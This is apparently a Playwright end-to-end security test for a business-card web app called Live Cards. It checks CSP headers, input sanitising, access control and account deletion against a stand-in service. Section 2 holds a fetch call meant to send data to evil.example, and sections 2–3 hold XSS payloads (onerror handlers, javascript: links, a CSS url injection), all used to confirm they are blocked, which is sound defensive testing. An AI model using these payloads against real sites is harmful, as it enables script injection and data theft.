// End-to-end run of Live Cards under the exact headers in vercel.json, with a stand-in for the service that enforces the same rules as the database.
// Run: build the site, serve it on port 4799 (npx vite preview --port 4799), then: node tools/live-cards-security-test.cjs   (needs Playwright; if its own browser is missing, set CHROMIUM_PATH to a Chromium binary). Nothing real is contacted; the service is a stand-in inside the test.
const {chromium}=require('playwright');const fs=require('fs'),path=require('path');
const {SITE,B,SB,standIn}=require('./lc-test-kit.cjs');
const out=[];const T=(ok,name,extra)=>{out.push((ok?'PASS ':'FAIL ')+name+(extra&&!ok?' :: '+extra:''));};
(async()=>{const b=await chromium.launch({executablePath:process.env.CHROMIUM_PATH||undefined,args:['--use-gl=angle','--use-angle=swiftshader','--enable-unsafe-swiftshader','--ignore-gpu-blocklist']});
const ctx=await b.newContext({viewport:{width:390,height:844}});
const S=await standIn(ctx),{files,reports,calls}=S; // the service stand-in and the site under the real headers (tools/lc-test-kit.cjs)
const errs=[];const page=async(url)=>{const p=await ctx.newPage();p.on('pageerror',e=>errs.push(url+' pageerror '+e.message));p.on('console',m=>{if(m.type()==='error'&&!/Failed to load resource/.test(m.text()))errs.push(url+' console '+m.text().slice(0,260))});p.on('dialog',d=>d.accept('This card pretends to be my business'));
  const resp=await p.goto(B+url);p._csp=resp.headers()['content-security-policy']||'';await p.waitForTimeout(1300);return p};

// 1. policy present and strict on every app page, old looser policy not used
for(const u of ['/studio/','/c/?id=sample','/live-cards/','/live-cards/terms/','/live-cards/privacy/']){const p=await page(u);const c=p._csp;
  T(c.includes("default-src 'none'")&&c.includes("script-src 'self';")&&!c.includes('unsafe-inline')&&!c.includes('posthog')&&c.includes("frame-ancestors 'none'"),'strict policy on '+u,c.slice(0,120));await p.close()}
{const p=await page('/card/');T(p._csp.includes("default-src 'self'")&&p._csp.includes('posthog'),'rest of the site keeps its own policy');await p.close()}

// 2. the policy really blocks injected script, outside requests and outside pictures
{const p=await page('/studio/');const r=await p.evaluate(async()=>{const o={};
  try{const s=document.createElement('script');s.textContent='window.__inj=1';document.body.appendChild(s)}catch(e){}o.inline=!!window.__inj;
  try{document.body.insertAdjacentHTML('beforeend','<img src=x onerror="window.__inj2=1">')}catch(e){}await new Promise(r=>setTimeout(r,300));o.handler=!!window.__inj2;
  try{eval('window.__inj3=1')}catch(e){}o.eval=!!window.__inj3;
  try{await fetch('https://evil.example/steal?t=1',{mode:'no-cors'});o.fetch=true}catch(e){o.fetch=false}
  o.img=await new Promise(res=>{const i=new Image();i.onload=()=>res(true);i.onerror=()=>res(false);i.src='https://evil.example/track.gif';setTimeout(()=>res(false),1500)});
  try{const f=document.createElement('iframe');f.src='https://evil.example/';document.body.appendChild(f);o.frame=true}catch(e){o.frame=false}
  return o});
  T(!r.inline,'injected inline script does not run');T(!r.handler,'injected event handler does not run');T(!r.eval,'eval is blocked');T(!r.fetch,'page cannot send data to an outside server');T(!r.img,'page cannot load an outside tracking picture');
  await p.waitForTimeout(500);const fr=await p.evaluate(()=>{try{return !!document.querySelector('iframe').contentDocument}catch(e){return false}});T(errs.some(e=>/frame-src/.test(e)),'outside page cannot be framed inside the app');await p.close();errs.length=0}
{const p=await page('/c/?id=sample');const ok=await p.evaluate(()=>{const e=window.LiveCard.init(document.createElement('div'));try{e.setBackground({type:'scene',id:'constructor'});e.setBackground({type:'image',url:'https://x.example/a.jpg") , url("https://evil.example/b'});return e.mode!=='custom'}catch(err){return false}});T(ok,'background engine refuses odd scene names and broken addresses');await p.close()}

// 3. hostile saved data cannot get through the card view
{const p=await page('/c/?id=sample');const r=await p.evaluate(()=>{const V=window.LiveCardView,n=V.normalize({name:'<img src=x onerror=alert(1)>',accent:'red;x',logo:{url:'https://evil.example/l.jpg'},
    actions:{website:'javascript:alert(1)',booking:'data:text/html,<script>1</script>',facebook:'vbscript:x',instagram:'https://ok.example/a'},
    background:{type:'image',url:'https://evil.example/x.jpg") , url("https://evil.example/2',bg:'url(x)',id:'constructor'}});
  return {n,m:[V.media('https://glzodwhyavexpuusbqjy.supabase.co/storage/v1/object/public/live-cards/11111111-2222-4333-8444-555555555555/bg-abc.mp4'),V.media('https://glzodwhyavexpuusbqjy.supabase.co/storage/v1/object/public/other-bucket/11111111-2222-4333-8444-555555555555/bg-abc.mp4'),
    V.media('https://glzodwhyavexpuusbqjy.supabase.co.evil.example/storage/v1/object/public/live-cards/11111111-2222-4333-8444-555555555555/bg-abc.mp4'),V.media('/live/samples/bg-pcflat.mp4'),V.media('/live/samples/../../x'),V.media('//evil.example/x.jpg'),V.media('/brand/meridian-mark.png')]}});
  T(r.n.actions.website===''&&r.n.actions.booking===''&&r.n.actions.facebook===''&&r.n.actions.instagram==='https://ok.example/a','card view drops dangerous links, keeps normal ones');
  T(r.n.logo.url===''&&r.n.background.url===''&&r.n.background.type==='scene'&&r.n.background.bg==='#000000'&&r.n.accent==='#2563eb','card view drops outside pictures and bad colours');
  T(!!r.m[0]&&!r.m[1]&&!r.m[2]&&!!r.m[3]&&!r.m[4]&&!r.m[5]&&!!r.m[6],'only own-store, sample and brand files count as pictures',JSON.stringify(r.m));
  const h=await p.evaluate(()=>{const ph=document.getElementById('lc');window.LiveCardView.render(ph,{name:'<img src=x onerror="window.__x=1">',company:'<script>window.__x=1</script>'},{});return {x:!!window.__x,imgs:ph.querySelectorAll('.lc-name img,.lc-name script').length,txt:ph.querySelector('.lc-name').textContent}});
  T(!h.x&&h.imgs===0&&h.txt.startsWith('<img'),'names are shown as plain text, never as code');await p.close()}

// 4. a visitor cannot list cards; unknown card shows a plain message
{const p=await page('/c/nobody-here');T(await p.$eval('#lc-msg h1',e=>e.textContent)==='Card not found','unknown link shows "Card not found"');
  const st=await p.evaluate(async()=>{try{await fetch('https://glzodwhyavexpuusbqjy.supabase.co/rest/v1/lc_cards?select=*',{headers:{apikey:'test-publishable-key'}}).then(r=>r.status)}catch(e){return 0}return (await fetch('https://glzodwhyavexpuusbqjy.supabase.co/rest/v1/lc_cards?select=*')).status});
  T(st===401,'listing cards without an account is refused (stand-in mirrors the database rule)');await p.close()}

// 5. full journey: build, sign in with a code, publish with an uploaded picture, view, report, delete
{const p=await page('/studio/');await p.fill('#f-name','Jordan Rivers');await p.fill('#f-company','Rivers Realty');await p.fill('#f-role','Realtor');
  await p.click('#t-buttons');await p.fill('#f-phone','281-555-0142');await p.fill('#f-email','jordan@riversrealty.example');await p.fill('#f-web','riversrealty.example');await p.fill('#f-ig','javascript:alert(1)');
  await p.click('#t-bg');await p.setInputFiles('#f-bg',SITE+'/public/card/bg/houston-skyline.jpg');await p.waitForTimeout(1200);
  await p.click('#t-publish');await p.waitForTimeout(300);
  T(await p.$eval('#pub-email',e=>!e.hidden),'studio asks for sign-in before publishing');
  await p.fill('#f-acct','not-an-email');await p.$eval('#pub-email',f=>f.noValidate=true);await p.click('#pub-email button');await p.waitForTimeout(400);T(S.otpSent===0,'bad email never reaches the service');
  await p.fill('#f-acct','Jordan@RiversRealty.example');await p.click('#pub-email button');await p.waitForTimeout(600);T(S.otpSent===1,'sign-in code requested once');
  await p.fill('#f-code','000000');await p.click('#pub-code button');await p.waitForTimeout(600);T(await p.$eval('#pub-code',e=>!e.hidden),'wrong code is refused');
  await p.fill('#f-code','123456');await p.click('#pub-code button');await p.waitForTimeout(900);
  const ses=await p.evaluate(()=>JSON.parse(localStorage.getItem('lc_session')||'null'));T(!!ses&&ses.user.email==='jordan@riversrealty.example','signed in');
  await p.fill('#f-slug','admin');await p.$eval('#f-rights',e=>e.checked=true).catch(()=>{});await p.click('#pub-btn');await p.waitForTimeout(700);T(S.card===null,'reserved link name refused');
  await p.fill('#f-slug','jordan-rivers');await p.click('#pub-btn');await p.waitForTimeout(2500);
  T(!!S.card&&S.card.published&&S.card.slug==='jordan-rivers','card published',JSON.stringify(calls.slice(-8)));
  const all=[...files.keys()],names=all.filter(n=>/\/bg-/.test(n));T(all.length===2&&names.length===1&&/^11111111-2222-4333-8444-555555555555\/bg-[a-z0-9]{1,16}\.jpg$/.test(names[0])&&all.some(n=>/^11111111-2222-4333-8444-555555555555\/og-[a-z0-9]{1,16}\.jpg$/.test(n)),'uploads used safe generated file names (background and link preview picture)',all.join());
  T(!!S.card&&S.card.data.background.type==='image'&&S.card.data.background.url.endsWith(names[0]||'x')&&S.card.data.actions.instagram==='','saved card holds own picture and no dangerous link');
  // publish again with a new picture: the old file is removed
  await p.click('#t-bg');await p.setInputFiles('#f-bg',SITE+'/public/card/bg/ribbon.jpg').catch(()=>{});await p.waitForTimeout(1200);await p.click('#t-publish');await p.waitForTimeout(300);
  T(await p.$eval('#pub-update',e=>!e.hidden),'after an edit the studio offers "Update my live card"');await p.click('#pub-update');await p.waitForTimeout(2500);
  T(files.size===2&&![...files.keys()].some(n=>all.includes(n)),'replacing the picture removes the old files',[...files.keys()].join());
  await p.close()}
{const p=await page('/c/jordan-rivers');const name=await p.$eval('.lc-name',e=>e.textContent).catch(()=>'');T(name==='Jordan Rivers','public link shows the published card',name);
  const img=await p.evaluate(()=>{const i=document.querySelector('.lc-img');return i?getComputedStyle(i).backgroundImage:''});T(/live-cards\/11111111/.test(img),'published picture loads from the client folder',img.slice(0,120));
  const hrefs=await p.$$eval('.lc-card a',as=>as.map(a=>a.getAttribute('href')));T(hrefs.every(h=>/^(tel:|mailto:|sms:|https?:\/\/|\/live-cards\/)/.test(h)),'every button on the card is a safe link',hrefs.join(' '));
  await p.click('#lc-report');await p.waitForTimeout(600);T(reports.length===1&&reports[0].p_slug==='jordan-rivers','report goes through the throttled door');await p.close()}
{const p=await page('/studio/');await p.click('#t-publish');await p.waitForTimeout(500);await p.click('#acct-del');await p.waitForTimeout(200);await p.click('#acct-del');await p.waitForTimeout(1500);
  const ses=await p.evaluate(()=>localStorage.getItem('lc_session'));T(S.card===null&&files.size===0&&!ses,'delete my account removes the card, the files and the sign-in',JSON.stringify({card:!!S.card,files:files.size,ses:!!ses}));await p.close()}
T(errs.length===0,'no page errors and nothing blocked by the policy during normal use',errs.slice(0,6).join(' | '));
console.log(out.join('\n'));console.log(out.filter(x=>x.startsWith('FAIL')).length+' FAIL of '+out.length);await b.close()})().catch(e=>{console.log(out.join('\n'));console.error('CRASH',e.message);process.exit(1)});
